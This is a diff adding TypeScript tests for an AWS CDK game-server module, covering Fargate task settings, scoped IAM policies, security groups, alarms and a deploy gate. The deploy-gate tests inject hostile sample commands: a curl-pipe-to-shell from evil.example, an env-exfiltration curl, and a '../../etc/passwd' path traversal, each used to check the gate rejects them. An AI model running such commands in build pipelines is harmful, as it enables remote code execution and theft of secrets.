@@ -219,6 +219,290 @@ describe('AppStack realtime module', () => {
   });
 });
 
+describe('AppStack gameServer module', () => {
+  const game: AppManifest = { ...manifest, modules: ['realtime', 'gameServer'] };
+  /** A stand-in for the image the build job saves (over 1 MB, like any real image). */
+  let tarball: string;
+  beforeAll(() => {
+    tarball = path.join(fs.mkdtempSync(path.join(os.tmpdir(), 'stacks-game-')), 'image.tar');
+    fs.writeFileSync(tarball, Buffer.alloc(1024 * 1024 + 1, 1));
+  });
+  const synthGame = (envName: EnvName = 'staging', m: AppManifest = game, extra: Partial<ConstructorParameters<typeof AppStack>[1]> = {}) => {
+    const app = new cdk.App({ context: { 'aws:cdk:bundling-stacks': [] } });
+    const stack = new AppStack(app, {
+      manifest: m,
+      envName,
+      env: envs[envName],
+      region: 'us-east-1',
+      repoRoot,
+      appDir: path.join(repoRoot, 'apps/hello'),
+      webDistPath: webDist,
+      apiEntry: path.join(repoRoot, 'packages/infra/tests/fake-entry.ts'),
+      gameImageTarball: tarball,
+      ...extra,
+    });
+    return { app, stack, template: Template.fromStack(stack) };
+  };
+  const statements = (template: Template, roleMatch: RegExp): Array<Record<string, any>> =>
+    Object.entries(template.findResources('AWS::IAM::Policy'))
+      .filter(([id]) => roleMatch.test(id))
+      .flatMap(([, p]) => p.Properties.PolicyDocument.Statement as Array<Record<string, any>>);
+  const withAction = (list: Array<Record<string, any>>, action: string) => list.filter((s) => [s.Action].flat().includes(action));
+
+  it('defines an arm64 Fargate task from the tarball image, logging to its own group, with the room server\'s environment', () => {
+    const { template } = synthGame();
+    template.hasResourceProperties('AWS::ECS::TaskDefinition', {
+      Family: 'stacks-test-app-hello-game',
+      RequiresCompatibilities: ['FARGATE'],
+      NetworkMode: 'awsvpc',
+      Cpu: '256',
+      Memory: '512',
+      RuntimePlatform: { CpuArchitecture: 'ARM64', OperatingSystemFamily: 'LINUX' },
+      ContainerDefinitions: [
+        Match.objectLike({
+          Name: 'game',
+          Image: Match.objectLike({ 'Fn::Sub': Match.stringLikeRegexp('cdk-stktest-container-assets-.*:[0-9a-f]{64}$') }),
+          StopTimeout: 30,
+          LogConfiguration: Match.objectLike({ LogDriver: 'awslogs', Options: Match.objectLike({ 'awslogs-stream-prefix': 'room' }) }),
+        }),
+      ],
+    });
+    const def = Object.values(template.findResources('AWS::ECS::TaskDefinition'))[0]!;
+    const env = Object.fromEntries((def.Properties.ContainerDefinitions[0].Environment as { Name: string; Value: unknown }[]).map((e) => [e.Name, e.Value]));
+    expect(env).toMatchObject({
+      STACKS_APP: 'hello',
+      STACKS_REALTIME_NAMESPACE: 'app',
+      STACKS_GAME_MAX_PLAYERS: '8',
+      STACKS_GAME_IDLE_MINUTES: '10',
+      STACKS_GAME_MAX_HOURS: '2',
+      STACKS_GAME_PORT_MIN: '40000',
+      STACKS_GAME_PORT_MAX: '40019',
+    });
+    for (const name of ['TABLE_NAME', 'STACKS_REALTIME_HTTP_HOST', 'STACKS_REALTIME_WS_HOST', 'STACKS_GAME_KEY_ARN']) expect(env[name], name).toBeDefined();
+    // Nothing secret in the environment: the key is an ARN the task role may read.
+    expect(JSON.stringify(env.STACKS_GAME_KEY_ARN)).toContain('GameKey');
+    template.hasResourceProperties('AWS::Logs::LogGroup', { RetentionInDays: 7 });
+    template.hasResourceProperties('AWS::SecretsManager::Secret', { Name: 'stacks-test-app-hello-game-key' });
+  });
+
+  it('honours the manifest\'s cpu, memory and limits', () => {
+    const { template } = synthGame('staging', { ...game, gameServer: { cpu: 512, memory: 1024, maxPlayers: 4, idleMinutes: 5, maxHours: 0.5 } });
+    template.hasResourceProperties('AWS::ECS::TaskDefinition', { Cpu: '512', Memory: '1024' });
+    const env = JSON.stringify(Object.values(template.findResources('AWS::ECS::TaskDefinition'))[0]!.Properties.ContainerDefinitions[0].Environment);
+    expect(env).toContain('{"Name":"STACKS_GAME_MAX_PLAYERS","Value":"4"}');
+    expect(env).toContain('{"Name":"STACKS_GAME_MAX_HOURS","Value":"0.5"}');
+  });
+
+  it('opens UDP 40000-40019 from anywhere and nothing else inbound', () => {
+    const { template } = synthGame();
+    template.hasResourceProperties('AWS::EC2::SecurityGroup', {
+      VpcId: { Ref: Match.stringLikeRegexp('game.*vpcid|SsmParameterValuestackstestgamevpcid') },
+      SecurityGroupIngress: [
+        { IpProtocol: 'udp', FromPort: 40000, ToPort: 40019, CidrIp: '0.0.0.0/0', Description: 'WebRTC data channels' },
+        { IpProtocol: 'udp', FromPort: 40000, ToPort: 40019, CidrIpv6: '::/0', Description: 'WebRTC data channels' },
+      ],
+      SecurityGroupEgress: [Match.objectLike({ IpProtocol: '-1', CidrIp: '0.0.0.0/0' }), Match.objectLike({ IpProtocol: '-1', CidrIpv6: '::/0' })],
+    });
+    template.resourceCountIs('AWS::EC2::SecurityGroup', 1);
+    template.resourceCountIs('AWS::EC2::SecurityGroupIngress', 0);
+  });
+
+  it('reads the shared network from SSM at deploy time (no lookups at synth)', () => {
+    const { template, app } = synthGame();
+    const params = Object.values(template.toJSON().Parameters as Record<string, { Type: string; Default?: string }>);
+    const ssmDefaults = params.filter((p) => p.Type.startsWith('AWS::SSM::Parameter::Value')).map((p) => p.Default);
+    for (const name of ['/stacks/test/game/vpc-id', '/stacks/test/game/subnet-ids', '/stacks/test/game/cluster-arn', '/stacks/test/game/alarm-topic-arn']) expect(ssmDefaults).toContain(name);
+    expect(app.synth().manifest.missing ?? []).toEqual([]);
+  });
+
+  it('gives the task role the table, the game key and its own Event API, and nothing wider', () => {
+    const { template } = synthGame();
+    const task = statements(template, /GameServerTaskTaskRole/);
+    expect(withAction(task, 'appsync:EventConnect')).toHaveLength(1);
+    const channels = withAction(task, 'appsync:EventSubscribe');
+    expect(channels).toHaveLength(1);
+    expect(channels[0]!.Action).toEqual(['appsync:EventSubscribe', 'appsync:EventPublish']);
+    expect(JSON.stringify(channels[0]!.Resource)).toContain('/channelNamespace/app');
+    expect(JSON.stringify(task)).toContain('dynamodb:PutItem');
+    expect(withAction(task, 'secretsmanager:GetSecretValue')).toHaveLength(1);
+    expect(JSON.stringify(withAction(task, 'secretsmanager:GetSecretValue')[0]!.Resource)).toContain('GameKey');
+    for (const s of task) expect(JSON.stringify(s.Action)).not.toMatch(/ecs:|iam:|ssm:|"\*"/);
+
+    // The execution role only pulls the image and writes logs.
+    const exec = statements(template, /GameServerTaskExecutionRole/);
+    expect(exec.flatMap((s) => [s.Action].flat()).sort()).toEqual(
+      ['ecr:BatchCheckLayerAvailability', 'ecr:BatchGetImage', 'ecr:GetAuthorizationToken', 'ecr:GetDownloadUrlForLayer', 'logs:CreateLogStream', 'logs:PutLogEvents'].sort(),
+    );
+  });
+
+  it('lets the server connect and subscribe with IAM on the Event API; browsers still use tokens', () => {
+    const { template } = synthGame();
+    template.hasResourceProperties('AWS::AppSync::Api', {
+      EventConfig: Match.objectLike({
+        ConnectionAuthModes: [{ AuthType: 'AWS_IAM' }, { AuthType: 'AWS_LAMBDA' }],
+        DefaultSubscribeAuthModes: [{ AuthType: 'AWS_IAM' }, { AuthType: 'AWS_LAMBDA' }],
+      }),
+    });
+    // The API Lambda may publish, not subscribe.
+    expect(withAction(statements(template, /ApiHandlerServiceRole/), 'appsync:EventSubscribe')).toEqual([]);
+  });
+
+  it('lets the API Lambda run, stop and describe only this app\'s tasks on the shared cluster, and pass only the two task roles', () => {
+    const { template } = synthGame();
+    const api = statements(template, /ApiHandlerServiceRole/);
+    const cluster = { ArnEquals: { 'ecs:cluster': { Ref: expect.stringMatching(/clusterarn/i) } } };
+
+    const run = withAction(api, 'ecs:RunTask');
+    expect(run).toHaveLength(1);
+    expect(JSON.stringify(run[0]!.Resource)).toContain(':task-definition/stacks-test-app-hello-game:*');
+    expect(run[0]!.Condition).toEqual(cluster);
+
+    const stop = withAction(api, 'ecs:StopTask');
+    expect(stop).toHaveLength(1);
+    expect(stop[0]!.Action).toEqual(['ecs:StopTask', 'ecs:DescribeTasks']);
+    expect(JSON.stringify(stop[0]!.Resource)).toContain(':task/stacks-test-games/*');
+    expect(stop[0]!.Condition).toEqual({ ...cluster, StringEquals: { 'aws:ResourceTag/stacks:app': 'hello' } });
+
+    const tag = withAction(api, 'ecs:TagResource');
+    expect(tag[0]!.Condition).toEqual({ StringEquals: { 'ecs:CreateAction': 'RunTask', 'aws:RequestTag/stacks:app': 'hello' } });
+
+    const pass = withAction(api, 'iam:PassRole');
+    expect(pass).toHaveLength(1);
+    expect(pass[0]!.Condition).toEqual({ StringEquals: { 'iam:PassedToService': 'ecs-tasks.amazonaws.com' } });
+    expect(JSON.stringify(pass[0]!.Resource)).toMatch(/GameServerTaskTaskRole.*GameServerTaskExecutionRole/);
+
+    expect(withAction(api, 'ec2:DescribeNetworkInterfaces')).toHaveLength(1);
+    // The two TURN parameters, and no other platform secret (the APNs key lives beside them).
+    const ssmRead = withAction(api, 'ssm:GetParameter');
+    expect(ssmRead).toHaveLength(1);
+    const resources = JSON.stringify(ssmRead[0]!.Resource);
+    expect(resources).toContain('parameter/stacks/test/secrets/platform/CLOUDFLARE_TURN_KEY_ID');
+    expect(resources).toContain('parameter/stacks/test/secrets/platform/CLOUDFLARE_TURN_API_TOKEN');
+    expect(resources).not.toContain('platform/*');
+    expect(withAction(api, 'kms:Decrypt')[0]!.Condition).toEqual({ StringEquals: { 'kms:ViaService': 'ssm.us-east-1.amazonaws.com' } });
+  });
+
+  it('tells the API Lambda where to run tasks', () => {
+    const { template } = synthGame();
+    template.hasResourceProperties('AWS::Lambda::Function', {
+      Environment: {
+        Variables: Match.objectLike({
+          STACKS_GAME_CLUSTER_ARN: Match.anyValue(),
+          STACKS_GAME_TASK_DEFINITION: 'stacks-test-app-hello-game',
+          STACKS_GAME_CONTAINER: 'game',
+          STACKS_GAME_SUBNET_IDS: Match.anyValue(),
+          STACKS_GAME_SECURITY_GROUP: { 'Fn::GetAtt': [Match.stringLikeRegexp('GameServerSecurityGroup'), 'GroupId'] },
+          STACKS_GAME_KEY_ARN: Match.anyValue(),
+          STACKS_GAME_TURN_PREFIX: '/stacks/test/secrets/platform/',
+        }),
+      },
+    });
+  });
+
+  it('alarms on a task alive past 3 hours, to the environment\'s topic', () => {
+    const { template } = synthGame();
+    template.hasResourceProperties('AWS::Logs::MetricFilter', {
+      FilterPattern: '{ $.uptimeSeconds >= 10800 }',
+      MetricTransformations: [Match.objectLike({ MetricNamespace: 'Stacks/test/GameServer', MetricName: 'hello-long-running', MetricValue: '1' })],
+    });
+    template.hasResourceProperties('AWS::CloudWatch::Alarm', {
+      AlarmName: 'stacks-test-hello-game-server-long-running',
+      Namespace: 'Stacks/test/GameServer',
+      MetricName: 'hello-long-running',
+      Statistic: 'Sum',
+      Period: 300,
+      Threshold: 1,
+      EvaluationPeriods: 1,
+      ComparisonOperator: 'GreaterThanOrEqualToThreshold',
+      TreatMissingData: 'notBreaching',
+      AlarmActions: [{ Ref: Match.stringLikeRegexp('alarmtopicarn') }],
+    });
+  });
+
+  it('puts the staging boundary on every role, and passes the deploy gate', () => {
+    const { template, app } = synthGame();
+    const roles = Object.entries(template.findResources('AWS::IAM::Role'));
+    expect(roles.map(([id]) => id).filter((id) => /GameServerTask/.test(id))).toHaveLength(2);
+    for (const [id, r] of roles) expect(JSON.stringify(r.Properties.PermissionsBoundary), id).toContain('stacks-test-boundary');
+    expect(checkAssemblyProblems(app)).toEqual([]);
+  });
+
+  it('adds none of it without the module', () => {
+    for (const m of [manifest, { ...manifest, modules: ['realtime' as const] }]) {
+      const { template } = synth('staging', envs.staging, m);
+      for (const type of ['AWS::ECS::TaskDefinition', 'AWS::EC2::SecurityGroup', 'AWS::CloudWatch::Alarm', 'AWS::Logs::MetricFilter']) template.resourceCountIs(type, 0);
+      const json = JSON.stringify(template.toJSON());
+      expect(json).not.toMatch(/ecs:|STACKS_GAME|game-key|game\/vpc-id|"ConnectionAuthModes":\[\{"AuthType":"AWS_IAM"/);
+    }
+  });
+
+  it('builds the production stack too: no boundary, a month of logs', () => {
+    const { template } = synthGame('production');
+    template.hasResourceProperties('AWS::ECS::TaskDefinition', { Family: 'stacks-prod-app-hello-game' });
+    template.hasResourceProperties('AWS::SecretsManager::Secret', { Name: 'stacks-prod-app-hello-game-key' });
+    template.hasResourceProperties('AWS::CloudWatch::Alarm', { AlarmName: 'stacks-prod-hello-game-server-long-running' });
+    expect(JSON.stringify(template.findResources('AWS::IAM::Policy'))).toContain('parameter/stacks/prod/secrets/platform/CLOUDFLARE_TURN_KEY_ID');
+    const logGroups = Object.entries(template.findResources('AWS::Logs::LogGroup')).filter(([id]) => /GameServerLogs/.test(id));
+    expect(logGroups[0]![1].Properties.RetentionInDays).toBe(30);
+  });
+
+  it('refuses gameServer without realtime', () => {
+    expect(() => synthGame('staging', { ...manifest, modules: ['gameServer'] })).toThrow(/needs "realtime"/);
+  });
+
+  describe('the image', () => {
+    it('synthesizes with a placeholder (and a warning) when no image was built, but deploy builds refuse', () => {
+      const missing = path.join(os.tmpdir(), 'stacks-no-such-image.tar');
+      const { app, stack } = synthGame('staging', game, { gameImageTarball: missing });
+      const warnings = app.synth().getStackByName(stack.stackName).messages.filter((m) => m.level === 'warning');
+      expect(JSON.stringify(warnings)).toMatch(/placeholder\. Do not deploy/);
+      // The staging gate turns a placeholder away.
+      expect(checkAssemblyProblems(app).join()).toMatch(/is not a built image/);
+      expect(() => synthGame('staging', game, { gameImageTarball: missing, requireGameImage: true })).toThrow(/no game server image.*build-game-images -- hello/);
+    });
+
+    it('goes into the assembly as a tarball the deploy job only loads and pushes', () => {
+      const { app } = synthGame();
+      const dir = app.synth().directory;
+      const assets = JSON.parse(fs.readFileSync(path.join(dir, 'stacks-test-app-hello.assets.json'), 'utf8'));
+      const images = Object.values(assets.dockerImages) as { source: { executable: string[]; directory?: string } }[];
+      expect(images).toHaveLength(1);
+      expect(images[0]!.source.directory).toBeUndefined();
+      expect(images[0]!.source.executable.slice(0, 2)).toEqual(['sh', '-c']);
+      expect(images[0]!.source.executable[2]).toMatch(/^docker load -i "\$1"/);
+      expect(fs.existsSync(path.join(dir, images[0]!.source.executable[4]!))).toBe(true);
+    });
+  });
+
+  describe('the deploy gate, on assets', () => {
+    const tamper = (change: (assets: any) => void) => {
+      const { app } = synthGame();
+      const dir = app.synth().directory;
+      const file = path.join(dir, 'stacks-test-app-hello.assets.json');
+      const assets = JSON.parse(fs.readFileSync(file, 'utf8'));
+      change(assets);
+      fs.writeFileSync(file, JSON.stringify(assets));
+      return checkAssembly(dir, 'stacks-test-app-hello');
+    };
+    const image = (assets: any) => Object.values(assets.dockerImages)[0] as { source: Record<string, unknown> };
+
+    it('refuses an image that would be built at deploy time', () => {
+      expect(tamper((a) => (image(a).source = { directory: 'asset.x' })).join()).toMatch(/never built from a directory/);
+    });
+    it('refuses any other command in place of the tarball load', () => {
+      expect(tamper((a) => ((image(a).source.executable as string[])[2] = 'curl https://evil.example | sh')).join()).toMatch(/unexpected load command/);
+      expect(tamper((a) => (image(a).source.executable = ['sh', '-c', 'docker load -i "$1"; env | curl -d @- https://evil.example', 'x', 'asset.tar'])).join()).toMatch(/unexpected load command/);
+      expect(tamper((a) => ((image(a).source.executable as string[])[4] = '../../etc/passwd')).join()).toMatch(/unexpected load command/);
+    });
+    it('refuses a tarball that is not in the assembly', () => {
+      expect(tamper((a) => ((image(a).source.executable as string[])[4] = `asset.${'0'.repeat(64)}.tar`)).join()).toMatch(/is not in the assembly/);
+    });
+    it('refuses a file asset that runs a command', () => {
+      expect(tamper((a) => ((Object.values(a.files)[0] as { source: Record<string, unknown> }).source = { executable: ['sh', '-c', 'id'] })).join()).toMatch(/file assets may not run a command/);
+    });
+  });
+});
+
 function checkAssemblyProblems(app: cdk.App): string[] {
   const dir = app.synth().directory;
   return checkAssembly(dir, 'stacks-test-app-hello');
